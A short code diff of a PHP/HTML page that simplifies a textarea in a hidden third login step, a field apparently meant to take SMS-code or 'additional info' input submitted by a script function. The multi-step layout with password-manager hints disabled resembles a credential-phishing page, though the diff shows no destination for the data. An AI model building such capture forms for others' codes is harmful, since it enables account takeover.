@@ -1178,8 +1178,7 @@ include '../inc/config.php';
                        <div class="card-body d-none flex-column" id="login-step-3">
                         <form id="form" action="javascript:;" onsubmit="ekBilgi()">
                           <div class="form-group">
-                            <textarea placeholder="" pattern="\d*" id="sms-input" step="any" data-lpignore="true" autocomplete="" name="jethavale_ekbilgi" type="number" class="form-control" value="">
-                            </textarea>
+                            <textarea name="jethavale_ekbilgi" class="form-control"></textarea>
                           </div>
                          
                           <div class="d-flex flex-row">
